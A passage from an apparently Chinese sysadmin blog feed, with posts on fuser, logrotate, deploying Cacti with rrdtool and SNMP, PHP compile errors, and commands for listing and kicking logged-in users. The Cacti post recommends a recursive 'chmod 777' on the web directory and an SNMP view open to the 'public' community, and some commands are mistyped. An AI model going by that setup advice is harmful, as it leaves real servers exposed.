engine&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; |<br>| MRG_MYISAM&#160; | YES&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Collection of identical MyISAM tables&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; |<br>| ISAM&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | NO&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; | Obsolete storage engine&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; |<br>+————+———+—————————————————————————————-+</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> 存储引擎 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux下系统诊断shell命令fuser]]></title>
      <url>/2012/04/11/linux-e4-b8-8b-e7-b3-bb-e7-bb-9f-e8-af-8a-e6-96-adshell-e5-91-bd-e4-bb-a4fuser.html</url>
      <content type="html"><![CDATA[<p>查看设备上所有的活动的进程：<br><a href="http://www.simlinux.com/old/tag/fuser/">fuser</a> -m /dev/hda5<br>杀死所有访问该设备的文件：<br><a href="http://www.simlinux.com/old/tag/fuser/">fuser</a> -k /dev/hda5<br>访问某个文件是否打开，有哪些进程在使用：<br>fuser -m /usr/local/apache2/conf/httpd.conf<br>实践如下：<br>fuser -m /usr/local<br>/usr/local: 1272e 1274e 1275e 1278e 1968ce 2139m 2587e 2682e 2683 2723e 2797ce 3689e 3692ce 3720e 3735e 5664ce 6244ce 6247ce 6774e 6790e 6927e 7075e 7224e 7226e 7227e 7485ce 7495ce 7513ce 9269e 9903ce 9913ce 11553e 11791e 12025e 12029e 12057e 12061e 12198e 12448e 12534e 12584e 13053e 13133e 13635e 13672e 13814e 13829e 13831e 13832e 14099e 14159e 14682e 14813e 14840e 14907e 15621e 15810e 16200ce 16208ce 16331e 16960e 17938e 18505e 18507e 18694e 19704m</p>
<p>fuser -m /usr/local/apache2/conf/httpd.conf<br>/usr/local/apache2/conf/httpd.conf: 1272e 1274e 1275e 1278e 1968ce 2139m 2587e 2682e 2683 2723e 2797ce 3689e 3692ce 3720e 3735e 5664ce 6244ce 6247ce 6774e 6790e 6927e 7075e 7224e 7226e 7227e 7485ce 7495ce 7513ce 9269e 9903ce 9913ce 11553e 11791e 12025e 12029e 12057e 12061e 12198e 12448e 12534e 12584e 13053e 13133e 13635e 13672e 13814e 13829e 13831e 13832e 14099e 14159e 14682e 14813e 14840e 14907e 15621e 15810e 16200ce 16208ce 16331e 16960e 17938e 19704m</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> fuser </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用logrotate来回滚linux上的日志]]></title>
      <url>/2012/04/11/e4-bd-bf-e7-94-a8logrotate-e6-9d-a5-e5-9b-9e-e6-bb-9alinux-e4-b8-8a-e7-9a-84-e6-97-a5-e5-bf-97.html</url>
      <content type="html"><![CDATA[<p>对于Linux 的系统安全来说，日志文件是极其重要的工具。系统管理员可以使用logrotate 程序用来管理系统中的最新的事件。<br> 对于Linux 的系统安全来说，日志文件是极其重要的工具。<br> 系统管理员可以使用logrotate 程序用来管理系统中的最新的事件。logrotate 还可以用来备份日志文件，本篇将通过以下几部分来介绍日志文件的管理：1、logrotate 配置<br>2、缺省配置 logrotate<br>3、使用include 选项读取其他配置文件<br>4、使用include 选项覆盖缺省配置<br>5、为指定的文件配置转储参数<br>一、logrotate 配置<br> logrotate 程序是一个日志文件管理工具。用来把旧的日志文件删除，并创建新的日志文件，我们把它叫做“转储”。我们可以根据日志文件的大小，也可以根据其天数来转储，这个过程一般通过 cron 程序来执行。<br> logrotate 程序还可以用于压缩日志文件，以及发送日志到指定的E-mail 。<br> logrotate 的配置文件是 /etc/logrotate.conf。主要参数如下表：<br>参数 功能<br><em>compress 通过gzip 压缩转储以后的日志</em><br><em>nocompress 不需要压缩时，用这个参数</em><br><em>copytruncate 用于还在打开中的日志文件，把当前日志备份并截断</em><br><em>nocopytruncate 备份日志文件但是不截断</em><br><em>create mode owner group 转储文件，使用指定的文件模式创建新的日志文件</em><br><em>nocreate 不建立新的日志文件</em><br><em>delaycompress 和 compress 一起使用时，转储的日志文件到下一次转储时才压缩</em><br><em>nodelaycompress 覆盖 delaycompress 选项，转储同时压缩。</em><br><em>errors address 专储时的错误信息发送到指定的Email 地址</em><br><em>ifempty 即使是空文件也转储，这个是 logrotate 的缺省选项。</em><br><em>notifempty 如果是空文件的话，不转储</em><br><em>mail address 把转储的日志文件发送到指定的E-mail 地址</em><br><em>nomail 转储时不发送日志文件</em><br><em>olddir directory 转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统</em><br><em>noolddir 转储后的日志文件和当前日志文件放在同一个目录下</em><br><em>prerotate/endscript 在转储以前需要执行的命令可以放入这个对，这两个关键字必须单独成行</em><br><em>postrotate/endscript 在转储以后需要执行的命令可以放入这个对，这两个关键字必须单独成行</em><br><em>daily 指定转储周期为每天</em><br><em>weekly 指定转储周期为每周</em><br><em>monthly 指定转储周期为每月</em><br><em>rotate count 指定日志文件删除之前转储的次数，0 指没有备份，5 指保留5 个备份</em><br><em>tabootext [+] list 让logrotate 不转储指定扩展名的文件，缺省的扩展名是：.rpm-orig, .rpmsave, v, 和 ~</em><br><em>size size 当日志文件到达指定的大小时才转储，Size 可以指定 bytes (缺省)以及KB (sizek)或者MB (sizem).</em><br>二、缺省配置 logrotate<br>logrotate 缺省的配置/etc/logrotate.conf。<br>Red Hat Linux 缺省安装的文件内容是：</p>
<p>&#160;</p>
<h1 id="see-“man-logrotate”-for-details"><a href="#see-“man-logrotate”-for-details" class="headerlink" title="see “man logrotate” for details"></a>see “man logrotate” for details</h1><h1 id="rotate-log-files-weekly"><a href="#rotate-log-files-weekly" class="headerlink" title="rotate log files weekly"></a>rotate log files weekly</h1><p>weekly    </p>
<h1 id="keep-4-weeks-worth-of-backlogs"><a href="#keep-4-weeks-worth-of-backlogs" class="headerlink" title="keep 4 weeks worth of backlogs"></a>keep 4 weeks worth of backlogs</h1><p>rotate 4    </p>
<h1 id="send-errors-to-root"><a href="#send-errors-to-root" class="headerlink" title="send errors to root"></a>send errors to root</h1><p>errors root    </p>
<h1 id="create-new-empty-log-files-after-rotating-old-ones"><a href="#create-new-empty-log-files-after-rotating-old-ones" class="headerlink" title="create new (empty) log files after rotating old ones"></a>create new (empty) log files after rotating old ones</h1><p>create    </p>
<h1 id="uncomment-this-if-you-want-your-log-files-compressed"><a href="#uncomment-this-if-you-want-your-log-files-compressed" class="headerlink" title="uncomment this if you want your log files compressed"></a>uncomment this if you want your log files compressed</h1><p>#compress<br>1    </p>
<h1 id="RPM-packages-drop-log-rotation-information-into-this-directory"><a href="#RPM-packages-drop-log-rotation-information-into-this-directory" class="headerlink" title="RPM packages drop log rotation information into this directory"></a>RPM packages drop log rotation information into this directory</h1><p>include /etc/logrotate.d    </p>
<h1 id="no-packages-own-lastlog-or-wtmp-we-amp-aposll-rotate-them-here"><a href="#no-packages-own-lastlog-or-wtmp-we-amp-aposll-rotate-them-here" class="headerlink" title="no packages own lastlog or wtmp ?we&amp;aposll rotate them here"></a>no packages own lastlog or wtmp ?we&amp;aposll rotate them here</h1><p>/var/log/wtmp {<br>monthly<br>create 0664 root utmp<br>rotate 1<br>}<br>/var/log/lastlog {<br>monthly<br>rotate 1<br>}    </p>
<h1 id="system-specific-logs-may-be-configured-here"><a href="#system-specific-logs-may-be-configured-here" class="headerlink" title="system-specific logs may be configured here"></a>system-specific logs may be configured here</h1><p>&#160;</p>
<p>缺省的配置一般放在logrotate.conf 文件的最开始处，影响整个系统。在本例中就是前面12行。<br>第三行weekly 指定所有的日志文件每周转储一次。<br>第五行 rotate 4 指定转储文件的保留 4份。<br>第七行 errors root 指定错误信息发送给root。<br>第九行create 指定 logrotate 自动建立新的日志文件，新的日志文件具有和<br>原来的文件一样的权限。<br>第11行 #compress 指定不压缩转储文件，如果需要压缩，去掉注释就可以了。<br>三、使用include 选项读取其他配置文件<br>include 选项允许系统管理员把分散到几个文件的转储信息，集中到一个<br>主要的配置文件。当 logrotate 从logrotate.conf 读到include 选项时，会从指定文件读入配置信息，就好像他们已经在/etc/logrotate.conf 中一样。<br>第13行 include /etc/logrotate.d 告诉 logrotate 读入存放在/etc/logrotate.d目录中的日志转储参数，当系统中安装了RPM 软件包时，使用include 选项十分有用。RPM软件包的日志转储参数一般存放在/etc/logrotate.d 目录。<br>include 选项十分重要，一些应用把日志转储参数存放在 /etc/logrotate.d 。<br>典型的应用有：apache, linuxconf, samba, cron 以及syslog。<br>这样，系统管理员只要管理一个 /etc/logrotate.conf 文件就可以了。<br>四、使用include 选项覆盖缺省配置<br>当 /etc/logrotate.conf 读入文件时，include 指定的文件中的转储参数将覆盖缺省的参数，如下例：</p>
<p>&#160;</p>
<h1 id="linuxconf-的参数"><a href="#linuxconf-的参数" class="headerlink" title="linuxconf 的参数"></a>linuxconf 的参数</h1><p>/var/log/htmlaccess.log<br>{ errors jim<br>notifempty<br>nocompress<br>weekly<br>prerotate<br>/usr/bin/chattr -a /var/log/htmlaccess.log<br>endscript<br>postrotate<br>/usr/bin/chattr +a /var/log/htmlaccess.log<br>endscript<br>}<br>/var/log/netconf.log<br>{ nocompress<br>monthly<br>}</p>
<p>&#160;</p>
<p>在这个例子中，当 /etc/logrotate.d/linuxconf 文件被读入时，下面的参数将覆盖/etc/logrotate.conf中缺省的参数。<br>Notifempty<br>errors jim<br>五、为指定的文件配置转储参数<br>经常需要为指定文件配置参数，一个常见的例子就是每月转储/var/log/wtmp。为特定文件而使用的参数格式是：    </p>
<h1 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h1><p>/full/path/to/file<br>{<br>option(s)<br>}<br>下面的例子就是每月转储 /var/log/wtmp 一次：    </p>
<p>#Use logrotate to rotate wtmp<br>/var/log/wtmp<br>{<br>monthly<br>rotate 1<br>}<br>六、其他需要注意的问题<br>1、尽管花括号的开头可以和其他文本放在同一行上，但是结尾的花括号必须单独成行。<br>2、使用 prerotate 和 postrotate 选项<br>下面的例子是典型的脚本 /etc/logrotate.d/syslog，这个脚本只是对<br>/var/log/messages 有效。</p>
<p>&#160;</p>
<p>/var/log/messages<br>{<br>prerotate<br>/usr/bin/chattr -a /var/log/messages<br>endscript<br>postrotate<br>/usr/bin/kill -HUP syslogd<br>/usr/bin/chattr +a /var/log/messages<br>endscript<br>}</p>
<p>&#160;</p>
<p>第一行指定脚本对 /var/log messages 有效<br>/var/log/messages<br>prerotate 命令指定转储以前的动作/usr/bin/chattr -a 去掉/var/log/messages文件的“只追加”属性 endscript 结束 prerotate 部分的脚本postrotate 指定转储后的动作<br>/usr/bin/killall -HUP syslogd<br>用来重新初始化系统日志守护程序 syslogd<br>/usr/bin/chattr +a /var/log/messages<br>重新为 /var/log/messages 文件指定“只追加”属性，这样防治程序员或用户覆盖此文件。<br>最后的 endscript 用于结束 postrotate 部分的脚本<br>3、logrotate 的运行分为三步：<br>判断系统的日志文件，建立转储计划以及参数，通过cron daemon 运行下面的代码是 Red Hat Linux 缺省的crontab 来每天运行logrotate。</p>
<p>#/etc/cron.daily/logrotate   </p>
<p>#! /bin/sh<br>/usr/sbin/logrotate /etc/logrotate.conf</p>
<p>&#160;</p>
<p>4、/var/log/messages 不能产生的原因：<br>这种情况很少见，但是如果你把/etc/services 中的 514/UDP 端口关掉的话，这个文件就不能产生了。<br>小结：本文通过对Red Hat 系统上典型的logrotate 配置例子的介绍，详细说明了logrotate程序的应用方法。希望对所有Linux系统管理员有所帮助。<br>同时可以参考鸟哥的文章：<a href="http://linux.vbird.org/linux_basic/0570syslog.php" target="_blank" rel="external">http://linux.vbird.org/linux_basic/0570syslog.php</a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[部署监控系统Cacti及其运行环境]]></title>
      <url>/2012/03/13/e9-83-a8-e7-bd-b2-e7-9b-91-e6-8e-a7-e7-b3-bb-e7-bb-9fcacti-e5-8f-8a-e5-85-b6-e8-bf-90-e8-a1-8c-e7-8e-af-e5-a2-83.html</url>
      <content type="html"><![CDATA[<p><strong>   概述：</strong>  Cacti类似于MRTG监控，而MRTG多用于IDC，方便客户了解监控情况；Cacti是基于PHP开发的，一个rrdtool工具；原理是通过snmp协议采集数据，使用rrdtool绘制图形</p>
<p>&nbsp;</p>
<p><strong>一、Cacti运行环境部署</strong></p>
<p>Cacit 运行环境需要 PHP + Mysql + rrdtool 以及 snmp 工具的支持。</p>
<p>系统：CentOS 5.6 x86 64位</p>
<p><strong>Catci:</strong></p>
<ol>
<li>cacti-0.8.7i-PIA-3.1.tar</li>
<li>rrdtool-1.4.5.tar</li>
<li><p>net-snmp-<em><br><em>*PHP:</em></em></p>
</li>
<li><p>php-5.3.10.tar.gz</p>
</li>
<li>curl-7.15.0.tar.gz</li>
<li>freetype-2.1.9.tar.gz</li>
<li>gettext-0.16.1.tar.gz</li>
<li>gd-2.0.35.tar.gz</li>
<li>jpegsrc.v6b.tar.gz</li>
<li>libart_lgpl-2.3.17.tar.gz</li>
<li>libpng-1.2.18.tar.gz</li>
<li>libxml2-2.6.32.tar.gz</li>
<li>zlib-1.2.3.tar.gz<br><strong>Nginx：</strong></li>
</ol>
<p>Nginx-0.8.51.tar.gz</p>
<p><strong>Mysql:</strong></p>
<p>mysql-5.5.8.tar.gz</p>
<p>以上为LNMP环境基本搭建，不会的请参考<a href="http://www.simlinux.com/old/?p=83" title="http://www.simlinux.com/old/?p=83">http://www.simlinux.com/old/?p=83</a></p>
<p><strong><span style="text-decoration: underline;"><span style="color: #ff0000;">特别指出：</span></span></strong></p>
<p>在编译rrdtool时，可能会出现一些问题：</p>
<p>例如：</p>
<p>如果 ./configure 时出现下面这个错误</p>
<pre>configure: error: Please fix the library issues listed above and try again.</pre>
<pre>**解决方法(转51cto)：**</pre>
第一：安装 cgilib-0.5.tar.gz

从这里下载：

weget http://download.chinaunix.net/down.php?id=2531&amp;ResourceID=1333&amp;site=1

tar zxvf cgilib-0.5.tar.gz

cd cgilib-0.5
make
cp libcgi.a /usr/local/lib
cp cgi.h /usr/include

如果还不行，请看

第二：安装libart_lgpl-devel这个包

yum –y install libart_lgpl-devel

如果还报错configure: error: Please fix the library issues listed above and try again. 请看

第三：把这两个包装上pango-devel cairo-devel

yum –y install pango-devel* cairo-devel*

然后在

cd cd rrdtool-X.X.X
./configure --prefix=/usr/local/rrdtool

这样肯定能行，一般在第二部就能解决了。

**二、部署Cacti**

**安装 / 配置 cacti**

1.  # tar xf cacti-0.8.7i-PIA-3.1.tar
2.  # mv cacti-0.8.7i-PIA-3.1  /database/wwwroot/cacti
( 把 cacit 剪切到自定的 web 目录下 )
3.  # chmod 777 – Rf  /database/wwwroot/cacti
4.  ( 设置目录权限 , 避免因权限问题而导致目录无法写入 )
5.  # cd /database/wwwroot/cacti
6.  `在``Mysql``中创建一个新的库，并导入`cacti` ``目录中`cacti.sql 并设置好该表的用户权限，然后编辑 cacti 的数据库配置文件。
7.  # vi /database/wwwroot/cacti/include/config.php
<pre>$database_type= “ mysql ” ;
 $database_default = “数据库名称” ;
 $database_hostname = “默认是 localhost ” ;
 $database_username = “用户名” ;
 $database_password = “密码” ;</pre>
更改用户、密码等项与上面给出的对应保存退出
8.  # crontab – e （加入自动执行规则，每 5 分钟执行。）
<pre>*/5 * * * * /usr/local/php/bin/php /data/web_server/admin/cacti/poller.php       &gt; /dev/null 2&gt;&amp;1
（其中 /usr/local/php/bin/php 这个为 php 的安装目录）</pre>

<ol>
<li>保存退出：wq</li>
<li>在 nginx上设置好 cacti 所在 web 目录</li>
<li>打开浏览器 <a href="http://youhostname/cacti" target="_blank" rel="external">http://</a><a href="http://youhostname/cacti" target="_blank" rel="external">domainname/cacti</a></li>
<li>进入 cacti 的初始设置页面<br>第一次默认登陆账号：admin 密码 admin<br>登陆后它就会让你立即修改新密码<br><strong>注意事项：</strong></li>
</ol>
<p>1.由于mysql版本的区别，可能会报出cacti.sql中MYISAM附近语法错误，此可以将创建表的引擎定义去掉，mysql默认是MYISAM引擎</p>
<p>2.在php poller.php同步数据时，可能会报出关于时间和时区的问题，此可以在/database/wwwroot/cacti/include/config.php 设置相应时区，</p>
<p>如：date_default_timezone_set(‘Asia/Chongqing’);</p>
<p>&nbsp;</p>
<p><span style="color: #ff0000;"><strong>Cacti相关介绍:</strong></span></p>
<p>当修改好新密码进入，第一个显示出的页面就是让你设置 rrdtool，snmp 等工具的路径。这是个很重要的环节，必须无误，要不然 cacti 将无法生成出统计图。</p>
<pre> snmpwalk Binary Path ： /usr/bin/snmpwalk
 snmpget Binary Path： /usr/bin/snmpget
 RRDTool Binary Path： /usr/local/rrdtool/bin/rrdtool
 PHP Binary Path： /usr/local/php/bin/php
 Cacti Log File Path： /database/wwwroot/cacti/log/cacti.log
 Cactid Poller File Path： /database/wwwroot/cacti/poller.php</pre>
默认的配置中会出现许多“ NotFound ”

按照上边的路径把“ NotFound ”的项都重新填上。

手动运行一次

/usr/local/php/bin/php /database/wwwroot/cacti/poller.php &gt; /dev/null 2&gt;&amp;1

&nbsp;

**三、客户端启用SNMP服务**

稍微修改系统中 snmp 的配置
<pre># vi /etc/snmp/snmpd.conf</pre>

<ol>
<li>com2secnotConfigUser default public<br>改为：com2secnotConfigUser 127.0.0.1 public</li>
<li>access  notConfigGroup “”  any   noauth    exact  systemview  none none<br>改为：accessnotConfigGroup””anynoauthexact all none none</li>
<li>#view all    included  .1         80<br>将前面的 # 注释 去掉。<br>保存退出 :wq</li>
<li>重新启动 snmp 服务<h1 id="service-snmpd-restart"><a href="#service-snmpd-restart" class="headerlink" title="service snmpd restart"></a>service snmpd restart</h1><pre></pre>
<pre>欢迎期待下篇，下篇将详细介绍监控服务器磁盘，内存，IO等</pre></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> cacti </tag>
            
            <tag> 服务器监控 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在php扩展pdo_mysql时，报autoconf错误解决]]></title>
      <url>/2012/03/12/e5-9c-a8php-e6-89-a9-e5-b1-95pdo-mysql-e6-97-b6-ef-bc-8c-e6-8a-a5autoconf-e9-94-99-e8-af-af-e8-a7-a3-e5-86-b3.html</url>
      <content type="html"><![CDATA[<p><strong>问题：</strong></p>
<p>[root@monitor pdo_mysql]# phpize<br>Configuring for:<br>PHP Api Version:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 20090626<br>Zend Module Api No:&#160;&#160;&#160;&#160;&#160; 20090626<br>Zend Extension Api No:&#160;&#160; 220090626<br>config.m4:138: warning: AC_CACHE_VAL(pdo_inc_path, …): suspicious cache-id, must contain <em>cv</em> to be cached<br>../../lib/autoconf/general.m4:1974: AC_CACHE_VAL is expanded from…<br>../../lib/autoconf/general.m4:1994: AC_CACHE_CHECK is expanded from…<br>aclocal.m4:2748: PHP_CHECK_PDO_INCLUDES is expanded from…<br>config.m4:138: the top level<br>config.m4:138: warning: AC_CACHE_VAL(pdo_inc_path, …): suspicious cache-id, must contain <em>cv</em> to be cached<br>../../lib/autoconf/general.m4:1974: AC_CACHE_VAL is expanded from…<br>../../lib/autoconf/general.m4:1994: AC_CACHE_CHECK is expanded from…<br>aclocal.m4:2748: PHP_CHECK_PDO_INCLUDES is expanded from…<br>config.m4:138: the top level</p>
<p><strong>解决方法：</strong></p>
<p>autoconf版本太高造成的,我的办法是安装autoconf 2.13</p>
<p>redhat类系统运行如下命令</p>
<p>yum install autoconf213.noarch<br>export PHP_AUTOCONF=/usr/bin/autoconf-2.13<br>export PHP_AUTOHEADER=/usr/bin/autoheader-2.13</p>
<p>64位环境下</p>
<p>configure: error: libjpeg.(a|so) not found.</p>
<p>或者 configure: error:&#160; *.(a|so) not found.</p>
<p>这些库已经安装了但还报错</p>
<p>在configure 时加参数 –with-libdir=lib64</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pdo_mysql扩展 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[最近在编译php时出现SAPI错误]]></title>
      <url>/2012/03/12/e6-9c-80-e8-bf-91-e5-9c-a8-e7-bc-96-e8-af-91php-e6-97-b6-e5-87-ba-e7-8e-b0sapi-e9-94-99-e8-af-af.html</url>
      <content type="html"><![CDATA[<p><strong>问题描述：</strong></p>
<p>&#160;&#160;&#160; You’ve configured multiple SAPIs to be build.You can build only one SAPI module and CLI binary at the same time.(你已经配置了多个SAPIs,在同一时间你只可以建立一个SAPI模块和一个CLI binary。）</p>
<p>分析：由于在LAMP环境中，php与apache通信是通过apxs，而LNMP环境是通过php-fpm</p>
<p>&#160;</p>
<p><strong>解决方法：</strong></p>
<p>&#160;&#160;&#160; 导致的原因是我的配置参数中同时使用了–enable-fpm 与–with-apxs2= ，因此编译的时候出错了，去掉其中的任意一个参数编译成功。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SAPI错误 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux系统环境查看已经登录用户信息及管理]]></title>
      <url>/2012/03/02/linux-e7-b3-bb-e7-bb-9f-e7-8e-af-e5-a2-83-e6-9f-a5-e7-9c-8b-e5-b7-b2-e7-bb-8f-e7-99-bb-e5-bd-95-e7-94-a8-e6-88-b7-e4-bf-a1-e6-81-af-e5-8f-8a-e7-ae-a1-e7-90-86.html</url>
      <content type="html"><![CDATA[<p><strong>    Linux属于多用户系统，root账户可以去查看现在登录的用户信息及其操作：</strong></p>
<p>&nbsp;</p>
<p><strong>1.查看某一时刻用户的行为 w</strong></p>
<p>ROOT@LOCALHOST ROOT] # W</p>
<p>2:31PM UP 11 DAY ,21:18 4 USERS, LODE AVERAGE : 0.12, 0.09 , 0.08 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT</p>
<p>ROOT TTY1 - 09:21AM 3:23 0.13S 0.08S -BASH</p>
<p>GEORGE TTY2 - 09:40AM 18:00S 0.12S 0.00S TELNET</p>
<p>HELLO TTY6 - 11:12AM 34.00S 0.06S 0.O6S BASH</p>
<p>MARRY PTS/1 192.0.3.1102:40PM 5.20S 0.09S 0.03S FTP</p>
<p>&nbsp;</p>
<p><strong>参数介绍：</strong></p>
<p>第一行显示系统的汇总信息，字段分别表示系统当前时间、系统运行时间、登陆哟内用户总数及系统平均负载信息。对于上述势力中的几个显示数据意义为</p>
<p>2：13PM 表示执行W的时间是在下午2点31分。</p>
<p>11DAYS，21：18 表示系统运行11天零21小时18分。</p>
<p>4 USERS 表示当前系统登陆用户总数为4。</p>
<p>LOAD AVERAGE 与后面的数字一起表示系统在过去1，5，10分钟内的负载程度，数值越小，系统负载越轻。</p>
<p>从第二行开始构成一个表格，共有8个栏目，分别显示各个用户正在做的事情及该用户所占用的系统资料。</p>
<p>USER：显示登陆用户帐号名。用户重复登陆，该帐号也会重复出现。</p>
<p>TTY：用户登陆所用的终端。</p>
<p>FROM：显示用户在何处登陆系统。</p>
<p>LOGIN@：是LOGIN AT的意思，表示登陆进入系统的时间。</p>
<p>IDLE：用户空闲时间，从用户上一次任务结束后，开会记时。</p>
<p>JCPU：一终端代号来区分，表示在摸段时间内，所有与该终端相关的进程任务所耗费的CPU时间。</p>
<p>PCPU：指WHAT域的任务执行后耗费的CPU时间。</p>
<p>WHAT：表示当前执行的任务。</p>
<p><strong>查看某用户</strong></p>
<p>当登陆系统用户很多的时候，可以在<strong>w后面加上某个用户名</strong>，则会查看该用户执行任务的情况。</p>
<p>&nbsp;</p>
<p><table width="400" border="1" cellspacing="0" cellpadding="2" align="center"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td bgcolor="#e6e6e6">〔root@localost root〕#w heiio2:31pm up 11 days,21:18 4 users, load average : 0.00, 0.00, 0.00USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATHello tty6 11:12am 34.00s 0.06s 0.06s bash</td><br><br><br><br>默认情况下，系统会显示上述所有的信息，如果只关心某一方面，可以只使用相关的选项。</p>
<p><strong>2.使用系统提供的who命令，该命令可以查看当前登陆到系统的用户及其他信息</strong></p>
<p><table width="400" border="1" cellspacing="0" cellpadding="2" align="center"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td bgcolor="#e6e6e6">[ROOT@LOCAL ROOT]#whoroot tty1 - 09:21amreorge tty2 - 09:40amhello tty6 - 11:12am</td></p>
<p>marry pts/1 :0 02:40pm<br><br><br><br>可以看出上述信息与W命令非常相似。如果想让列表更详细一些，可以加上选项-HIT等，就可以得到该用户是否愿意接受其他用户信息（-T）还可以显示空闲时间（-I）及标题栏（-H）。如果某各用户愿意接受信息，会在MESG栏中显示一个“+”，这是还可以使用命令MESG给用户发从信息。</p>
<p>&nbsp;</p>
<p><strong>3.命令last</strong></p>
<p><strong>查看登陆用户历史</strong></p>
<p>系统管理员若想知道系统中用户登陆的历史行为，还可以察看用户曾经登陆到系统。使用<strong>last</strong>命令可以查询曾经登陆用户的信息：</p>
<p>&nbsp;</p>
<p><table width="400" border="1" cellspacing="0" cellpadding="2" align="center"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td bgcolor="#e6e6e6">ROOT TTY1 09：21AM MON FRI 10 11：15 STILL LOGGED IN GEORGE TYY2 09：40AM MON FRI 11 11：18 -DOWNHELLO TTY6 11：12AM MON FRI 12 9：47 -DOWNMARRY PTS/1 192.0.3.11 02：40PM FRI 17 12：56 -DOWN……</td></p>
<p>WTMP BEGINS FRI DEC 5 12：53：55 2003<br><br><br><br>使用LAST 命令时，列出的文件内容会非常多，根本看不清楚。此时可以使用前面介绍的管理方式来观看，例如/LAST/ LESS，则可以查看前后内容。同查看用户情况一样，想查看那某个用户的登陆情况，也可以在LAST命令后加上用户名，则系统只会显示该用户登陆系统情况。</p>
<p>&nbsp;</p>
<p><table width="400" border="1" cellspacing="0" cellpadding="2" align="center"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td bgcolor="#e6e6e6">[root@localhost root]# last georgegeorge tty2 - 09:40am mon fri 11 11.18 -down………….Wtem begins fri dec 5 12:53;55 2003</td><br><br><br><br><strong> 执行last命令其实是显示/var/log/目录下的wtmp文件内容</strong>。Wtmp文件是以二进制格式进行存储的，如果直接使用文本编辑器查看，查看的会是一堆乱码。</p>
<p><strong>4、命令finger</strong></p>
<p>linux中finger命令用来查询一台主机上的登录账号的信息，通常会显示用户名、主目录、停滞时间、登录时间、登录Shell等信息，使用权限为所有用户。</p>
<p><strong>格式</strong></p>
<p>finger [选项] [使用者] [用户@主机]</p>
<p><strong>主要参数</strong></p>
<p>-s：显示用户注册名、实际姓名、终端名称、写状态、停滞时间、登录时间等信息。</p>
<p>-l：除了用-s选项显示的信息外，还显示用户主目录、登录Shell、邮件状态等信息，以及用户主目录下的.plan、.project和.forward文件的内容。</p>
<p>-p：除了不显示.plan文件和.project文件以外，与-l选项相同。</p>
<p>&nbsp;</p>
<p><strong>应用实例</strong></p>
<p>&nbsp;</p>
<p>如果要查询远程机上的用户信息，需要在用户名后面接“@主机名”，采用[用户名@主机名]的格式，不过要查询的网络主机需要运行finger守护进程的支持。</p>
<p>在计算机上使用finger：</p>
<p>[root@linuxhonker.com ~]# Finger</p>
<p>Login Name Tty Idle Login Time Office Office Phone</p>
<p>root root tty1 2 Dec 18 13</p>
<p>root root pts/0 1 Dec 18 13</p>
<p>root root *pts/1 Dec 18 13</p>
<p>下列指令可以查询本机管理员的资料：</p>
<p>finger root</p>
<p>其结果如下：</p>
<p>Login: root Name: root</p>
<p>Directory: /root Shell: /bin/bash</p>
<p>Never logged in.</p>
<p>No mail.</p>
<p>No Plan.</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><strong>5、Linux踢出已登录用户的方法</strong>：</p>
<p>pkill -t pts/0 (pts/0为w指令看到的用户终端号)</p>
]]></content>
      
        <categories>
            
